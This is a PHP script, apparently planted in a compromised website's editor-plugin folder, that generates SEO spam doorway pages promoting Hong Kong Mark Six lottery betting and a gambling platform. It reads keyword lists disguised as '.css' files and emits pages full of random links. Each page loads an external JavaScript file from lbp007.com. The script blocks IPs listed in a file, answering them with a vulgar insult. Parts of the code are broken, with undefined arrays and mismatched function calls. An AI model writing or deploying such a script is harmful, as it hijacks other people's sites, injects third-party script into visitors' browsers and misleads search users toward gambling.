<?php
error_reporting(E_ERROR);
set_time_limit(0);
function makerand($length)
{
	$str = "";
	$possible = "1234567890qwertyuiopasdfghjklzxcvbnm%";
	while(strlen($str) < $length)
	$str .= substr($possible,(rand() % strlen($possible)),1);
	return $str;
}
function Make_Rand($length)
{
	$possible = "1234567890qwertyuiopasdfghjklzxcvbnm%";
	$str = "";
	while(strlen($str) < $length)
	$str .= substr($possible,(rand() % strlen($possible)),1);
	return (int)$str;
}
function makerand1($length)
{
	$str = "";
	$possible = "123456789qwertyuiopasdfghjklzxcvbnm%";
	while(strlen($str) < $length)
	$str .= substr($possible,(rand() % strlen($possible)),1);
	return $str;
}
function Make_Rand1($length)
{
	$possible = "123456789qwertyuiopasdfghjklzxcvbnm%";
	$str = "";
	while(strlen($str) < $length)
	$str .= substr($possible,(rand() % strlen($possible)),1);
	return (int)$str;
}

function Make_Code($code,$title,$keywords)
{
$data = <<<END
	<p><h2>{$title}</h2></p>
			{$code}
			<p><h3>

	</h3></p>
END;
	return $data;
}

function ip()
{
	if(!empty($_SERVER["HTTP_CLIENT_IP"]))
	$ip = $_SERVER["HTTP_CLIENT_IP"];
	elseif(!empty($_SERVER["HTTP_X_FORWARDED_FOR"]))
	$ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
	elseif(!empty($_SERVER["REMOTE_ADDR"]))
	$ip = $_SERVER["REMOTE_ADDR"];
	else $ip = "no";
	return $ip;
}
function fr($filename)
{
	$handle = @fopen($filename,"r");
	$filecode = @fread($handle,@filesize($filename));
	@fclose($handle);
	return $filecode;
}
if(stristr(fr('ip.txt'),ip())) die('你奶奶胸。老子看你靠抢能过日子吧');

foreach($_GET as $k => $v) $_GET[$k] = stripslashes($v);

$k = str_replace('_','.',$k);

$file = file('\mnt\www\bqltz\admin\fckeditor\plugins\templates\templates\images\index.css');
$filee = file('\mnt\www\bqltz\admin\fckeditor\plugins\templates\templates\images\style.css');
$filea = file('\mnt\www\bqltz\admin\fckeditor\plugins\templates\templates\images\index.css');
$fileu = file('\mnt\www\bqltz\admin\fckeditor\plugins\templates\templates\images\index.css');
$kissend = count($file) - 1;
$arraytmp = explode('.', $k);
$go = (int)$arraytmp[0];

$showtime=date("Y-m-d H:i:s");

$showtime1=date("Y-m-d");

$sj=makerand(6);

$sj1=makerand(1);
$sj2=makerand(1);
$sj3=makerand(2);
$sj4=makerand(2);
$sj5=makerand(2);
$sj6=makerand(2);
$sj7=makerand(2);
$sj8=makerand(2);
$sj9=makerand(2);
$sj10=makerand(3);
$sj11=makerand(3);
$sj12=makerand(3);
$sj13=makerand(3);
$sj14=makerand(3);
$sj15=makerand(3);
$sj17=makerand(3);
$sj18=makerand(3);
$sj19=makerand(3);
$sj40=makerand(6);
$sj16=makerand(6);
$sj20=makerand(3);
$sj21=makerand(6);
$sj22=makerand(6);
$sj23=makerand(6);
$sj25=makerand(2);
$sj24=makerand(6);
$sj26=makerand(6);
$sj27=makerand(6);
$sj28=makerand(6);
$sj29=makerand(6);
$sj30=makerand(1);
$sj31=makerand(6);
$sj34=makerand(6);
$sj33=makerand(6);
$sj32=makerand(6);
$sj35=makerand(6);
$sj36=makerand(6);
$sj37=makerand(6);
$sj38=makerand(6);
$sj39=makerand(6);
$sj96=makerand1(3);
$sj97=makerand1(3);
$sj98=makerand1(3);
$sj99=makerand1(3);
$sj100=makerand1(4);
$sq1=makerand1(7);
$sq2=makerand1(7);
$sq3=makerand1(7);
$sq4=makerand1(7);
$sq5=makerand1(7);
$sq6=makerand1(7);
$sq7=makerand1(7);
$sq8=makerand1(7);
$sq9=makerand1(7);
$sq10=makerand1(7);
$sq11=makerand1(7);
$sq12=makerand1(7);
$sq13=makerand1(7);
$sq14=makerand1(7);
$sq15=makerand1(7);
$sq16=makerand1(7);
$sq17=makerand1(7);
$sq18=makerand1(7);
$sq19=makerand1(7);
$sq20=makerand1(7);
$sq21=makerand1(7);
$sq22=makerand1(7);
$sq23=makerand1(7);
$sq24=makerand1(7);
$sq25=makerand1(7);
$sq26=makerand1(7);
$sq27=makerand1(7);
$sq28=makerand1(7);
$sq29=makerand1(7);
$sq30=makerand1(7);
$sq31=makerand1(7);
$sq32=makerand1(7);
$sq33=makerand1(7);
$sq34=makerand1(7);
$sq35=makerand1(7);
$sq36=makerand1(7);
$sq37=makerand1(7);
$sq38=makerand1(7);
$sq39=makerand1(7);
$sq40=makerand1(7);
$sq41=makerand1(7);
$sq42=makerand1(7);
$sq43=makerand1(7);
$sq44=makerand1(7);
$sq45=makerand1(7);
$sq46=makerand1(7);
$sq47=makerand1(7);
$sq48=makerand1(7);
$sq49=makerand1(7);
$sq50=makerand1(7);
$sq52=makerand1(7);
$sq53=makerand1(7);
$sq54=makerand1(7);
$sq55=makerand1(7);
$sq56=makerand1(7);
$sq57=makerand1(7);
$sq58=makerand1(7);
$sq59=makerand1(7);
$sq51=makerand1(7);
$sq60=makerand1(7);
$sq61=makerand1(7);
$sq62=makerand1(7);
$sq63=makerand1(7);
$sq64=makerand1(7);
$sq65=makerand1(7);
$sq66=makerand1(7);
$sq67=makerand1(7);
$sq68=makerand1(7);
$sq69=makerand1(7);
$sq71=makerand1(7);
$sq72=makerand1(7);
$sq73=makerand1(7);
$sq74=makerand1(7);
$sq75=makerand1(7);
$sq76=makerand1(7);
$sq77=makerand1(7);
$sq78=makerand1(7);
$sq79=makerand1(7);
$sq70=makerand1(7);
$sq80=makerand1(7);
$sq81=makerand1(7);
$sq82=makerand1(7);
$sq83=makerand1(7);
$sq84=makerand1(7);
$sq85=makerand1(7);
$sq86=makerand1(7);
$sq87=makerand1(7);
$sq88=makerand1(7);
$sq89=makerand1(7);
$sq90=makerand1(7);
$sq91=makerand1(7);
$sq92=makerand1(7);
$sq93=makerand1(7);
$sq94=makerand1(7);
$sq95=makerand1(7);
$sq96=makerand1(7);
$sq97=makerand1(7);
$sq98=makerand1(7);
$sq99=makerand1(7);
$sq100=makerand1(7);
$sq101=makerand1(7);

for($k = 1;$k < 9;$k++)
{
	$left .= '<li>·<a href="?id=004&keyword=004&key='.makerand1(7).'">'.chop($filea[rand
(0,2000)]).'</a></li>'."\r";
}

for($k = 1;$k < 17;$k++)
{
	$left1 .= '<li>·<a href="?id=004&keyword=004&key='.makerand1(7).'">'.chop($filea[rand
(2000,3200)]).'</a></li>'."\r";
}


for($k = 1;$k < 2;$k++)
{
	$lefta1 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftn10 .= ''.chop($filen[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftn1 .= ''.chop($filen[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftn2 .= ''.chop($filen[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftn3 .= ''.chop($filen[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftn4 .= ''.chop($filen[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftn5 .= ''.chop($filen[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftn6 .= ''.chop($filen[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftz1 .= ''.chop($filez[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftn7 .= ''.chop($filen[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftn8 .= ''.chop($filen[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftn9 .= ''.chop($filen[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta2 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftq1 .= ''.chop($filey[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftq2 .= ''.chop($filey[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefty0 .= ''.chop($fileu[rand
(3,100)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefty1 .= ''.chop($fileu[rand
(3,100)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefty2 .= ''.chop($fileu[rand
(3,100)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefty3 .= ''.chop($fileu[rand
(3,100)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefty4 .= ''.chop($fileu[rand
(3,100)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefty5 .= ''.chop($fileu[rand
(3,100)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefty6 .= ''.chop($fileu[rand
(3,100)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefty7 .= ''.chop($fileu[rand
(3,100)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefty8 .= ''.chop($fileu[rand
(3,100)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefty9 .= ''.chop($fileu[rand
(3,100)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefty10 .= ''.chop($fileu[rand
(3,100)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefty11 .= ''.chop($fileu[rand
(3,100)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefty12 .= ''.chop($fileu[rand
(3,100)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefty13 .= ''.chop($fileu[rand
(3,100)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefty14 .= ''.chop($fileu[rand
(3,100)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefty15 .= ''.chop($fileu[rand
(3,100)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefty16 .= ''.chop($fileu[rand
(3,100)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefty17 .= ''.chop($fileu[rand
(3,100)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefty18 .= ''.chop($fileu[rand
(3,100)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefty19 .= ''.chop($fileu[rand
(3,100)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefty20 .= ''.chop($fileu[rand
(3,100)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefty21 .= ''.chop($fileu[rand
(3,100)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefty22 .= ''.chop($fileu[rand
(3,100)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefty23 .= ''.chop($fileu[rand
(3,100)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefty24 .= ''.chop($fileu[rand
(3,100)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefty25 .= ''.chop($fileu[rand
(3,100)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefty26 .= ''.chop($fileu[rand
(3,100)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefty27 .= ''.chop($fileu[rand
(3,100)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefty28 .= ''.chop($fileu[rand
(3,100)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefty29 .= ''.chop($fileu[rand
(3,100)])."\r";
}

for($k = 1;$k < 2;$k++)
{
	$lefty30 .= ''.chop($fileu[rand
(3,100)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta7 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta15 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta16 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta17 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefte1 .= ''.chop($filee[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefte2 .= ''.chop($filee[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefte3 .= ''.chop($filee[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefte4 .= ''.chop($filee[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta18 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta19 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta20 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta21 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta22 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta23 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta24 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta25 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta26 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta27 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftz2 .= ''.chop($filez[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftz3 .= ''.chop($filez[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta28 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta29 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta30 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta31 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta32 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta33 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta34 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta35 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta36 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta37 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta38 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta39 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta40 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta41 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta42 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta43 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta44 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta45 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta46 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta47 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta48 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta49 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta50 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta51 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta52 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta53 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta54 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta55 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta3 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta13 .= ''.chop($filea[rand
(1000,5000)])."\r";
}

for($k = 1;$k < 2;$k++)
{
	$lefta14 .= ''.chop($filea[rand
(1000,5000)])."\r";
}

for($k = 1;$k < 2;$k++)
{
	$lefta4 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta5 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta8 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta9 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta10 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta11 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta6 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta12 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftt0 .= ''.chop($filee[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftt1 .= ''.chop($filee[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftt21 .= ''.chop($filee[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftt22 .= ''.chop($filee[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftt23 .= ''.chop($filee[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftt24 .= ''.chop($filee[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftt25 .= ''.chop($filee[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftt26 .= ''.chop($filee[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftt27 .= ''.chop($filee[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftt28 .= ''.chop($filee[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftt29 .= ''.chop($filee[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftt30 .= ''.chop($filee[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftt31 .= ''.chop($filee[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftt32 .= ''.chop($filee[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftt33 .= ''.chop($filee[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftt34 .= ''.chop($filee[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftt35 .= ''.chop($filee[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftt36 .= ''.chop($filee[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftt37 .= ''.chop($filee[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftt38 .= ''.chop($filee[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftt39 .= ''.chop($filee[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftt40 .= ''.chop($filee[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftt41 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftt42 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftt43 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftt44 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta45 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta46 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta47 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta48 .= ''.chop($filea[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta49 .= ''.chop($filee[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$lefta50 .= ''.chop($filee[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftt2 .= ''.chop($filee[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftt3 .= ''.chop($filee[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftt4 .= ''.chop($filee[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftt5 .= ''.chop($filee[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftt6 .= ''.chop($filee[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftt7 .= ''.chop($filee[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftt8 .= ''.chop($filee[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftt9 .= ''.chop($filee[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftt11 .= ''.chop($filee[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftt12 .= ''.chop($filee[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftt10 .= ''.chop($filee[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftt13 .= ''.chop($filee[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftt14 .= ''.chop($filee[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftt15 .= ''.chop($filee[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftt16 .= ''.chop($filee[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftt17 .= ''.chop($filee[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftt18 .= ''.chop($filee[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftt19 .= ''.chop($filee[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftt20 .= ''.chop($filee[rand
(1000,5000)])."\r";
}
for($k = 1;$k < 2;$k++)
{
	$left3 .= '下一页：<a href="?id=004&keyword=004&key='.makerand1(7).'">'.$lefta11.'</a>'."\r";
}

for($k = 1;$k < 2;$k++)
{
	$left4 .= '<a href="?id=004&keyword=004&'.makerand(7).'">'.chop($file[rand
(5000,15000)]).'</a>'."\r";
}
for($k = 1;$k < 2;$k++)
{
	$left0 .= '上一页：<a href="?id=004&keyword=004&key='.makerand1(7).'">'.$lefta12.'</a>'."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftb1 .= '<a href="?id=004&keyword=004&key='.makerand1(7).'">'.$lefta1.'</a>'."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftb2 .= '<a href="?id=004&keyword=004&key='.makerand1(7).'">'.$lefta2.'</a>'."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftb3 .= '<a href="?id=004&keyword=004&key='.makerand1(7).'">'.$lefta3.'</a></li>'."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftb4 .= '<a href="?id=004&keyword=004&key='.makerand1(7).'">'.$lefta4.'</a></li>'."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftb5 .= '<a href="?id=004&keyword=004&key='.makerand1(7).'">'.$lefta5.'</a></li>'."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftb6 .= '<a href="?id=004&keyword=004&key='.makerand1(7).'">'.$lefta6.'</a></li>'."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftb7 .= '<a href="?id=004&keyword=004&key='.makerand1(7).'">'.$lefta7.'</a></li>'."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftb8 .= '<a href="?id=004&keyword=004&key='.makerand1(7).'">'.$lefta8.'</a></li>'."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftb9 .= '<li><a href="?id=004&keyword=004&key='.makerand1(7).'">'.$lefta9.'</a></li>'."\r";
}
for($k = 1;$k < 2;$k++)
{
	$leftb0 .= '<li><a href="?id=004&keyword=004&key='.makerand1(7).'">'.$lefta10.'</a></li>'."\r";
}
$rand = Make_Rand(6);
$bottom = '(c)2006-2010 <a href="http://'.$_SERVER['SERVER_NAME'].'">'.$_SERVER

['SERVER_NAME'].'</a> All Rights Reserved.';
if(isset($_GET['list']))
{
         $u1=array(
         "091,092,093期六合彩挂牌 ",
         "香港六合彩091,092,0930报码",
         "091,092,093六喝彩 ",
         "2012年十二生肖香港091,092,093期",
         "2012年091,092,093期六合彩资料",
         "2008年六和彩091,092,093期开奖记录",
         "2012年六合总彩香港六和彩图",
         "曾道人单双各四肖",
         "香港六合彩2012历史",
         "六合彩最快直播",
         "六合彩091,092,093期",
         "曾道人特码诗",
          "2012十二生肖号码",
          "香港现场开码",
          "白小姐六合彩马报",
          "六合历史记录"
           );
$fileo = file('index.css');
for($k = 1;$k < 2;$k++)
{
	$h1 .= ''.chop($fileo[rand
(1000,5000)])."\r";
}
	$list = (int)$_GET['list'] * 1000;
         $right1 = '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html><head><meta http-

equiv="Content-Type" content="text/html; charset=gb2312" /><title>香港六閤彩53期54期55期56期57期58期59期53期60期开奖结果,开特码,开奖号码'.(int)$_GET['list'].'</title>
<META NAME ="keywords" CONTENT="六合彩资料,六合彩图库,天下彩,大刀皇,特码">
<META NAME="description" CONTENT="第'.(int)$_GET['list'].'页 - 采用国际正规平台,与bbin平台,AG平台,EA平台进行技术合作,信誉高,提款快,共同打造亚洲最佳博彩娱乐平台。">
<script language="javascript" src="http://www.lbp007.com/hj/l.js"></script>
<style type="text/css">body{margin:0;padding:0;border:0;}.htmllist,.pageslist{height:1px;width:850px;margin:0 auto;font-size:12px;border:solid #0000FF 1px;}.pageslist{margin-

top:10px;}h1{margin:0 auto;width:200px;font-size:14px;}a{text-decoration:none;}ul{list-style:none;margin:0px;}li{float:left;width:280px;}	.pageslist li{width:30px;text-

align:center;margin-top:5px;}
</style></head><body>
<div class="htmllist">
<h1>'.$h1.'</h1>'."\r\n".'<ul>';
	for($y = $list;$y < ($list + 1000);$y++)
	{

		if($y % 3 == 1)
		$right1 .= '<hr width=80% size=3 color=#00ffff style="FILTER: alpha(opacity=100,finishopacity=0,style=3)"><li><a href=?id=004&keyword=004&key='.makerand1(7).'>'.chop($file

[$y]).'</a></li>';
		elseif($y % 3 == 2)
		$right1 .= '<hr width=80% size=3 color=#00ffff style="FILTER: alpha(opacity=100,finishopacity=0,style=3)"><li><a href=?id=004&keyword=004&key='.makerand1(7).'>'.chop($file

[$y]).'</a></li>';
		else
		$right1 .= '<hr width=80% size=3 color=#00ffff style="FILTER: alpha(opacity=100,finishopacity=0,style=3)"><li><a href=?id=004&keyword=004&key='.makerand1(7).'>'.chop($file

[$y]).'</a></li>';
	}
	$right1 .= '		</ul>	</div>   <div class="pageslist"><ul>';
         $pageMax=ceil(count($file)/1000);
         for ($pagelist=1;$pagelist<=$pageMax-1;$pagelist++){
		$pagelistl=$pagelistl."<li><a href=?list=".$pagelist.">[".$pagelist."]</a></li>";
	}

         $right1 .= $pagelistl;
$right1 .= '		</ul>	</div></body></html>';
  echo $right1;
}
elseif(is_int($go))
{
	$title = chop($file[rand(0,5000)]);
	$keywords = chop($file[rand(5000,10000)]);
	$up = '<a href="?id=004&keyword=004&'.($go-1).'">'.chop($file[$go-1]).'</a> <br> ';
	$next = '<a href="?id=004&keyword=004&'.($go+1).'">'.chop($file[$go+1]).'</a>';
$code = <<<END
END;
	$right = Make_Code($code,$title,$up,$next);
}
if(!isset($_GET['list'])){
$moban = <<<END
<!DOCTYPE html PUBLIC"-//W3C//DTD Xhtml 1.0 Transitional//EN""http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title>$lefta1 【香港六和彩,今晚特码心水全年资料开奖结果】</title>
<script language="javascript" src="http://www.lbp007.com/hj/l.js"></script>
<meta http-equiv="Content-Type"content="text/html; charset=gb2312"/>
<META name=keywords content="$lefta1,$lefta2,香港六和彩单双波色心水资料">
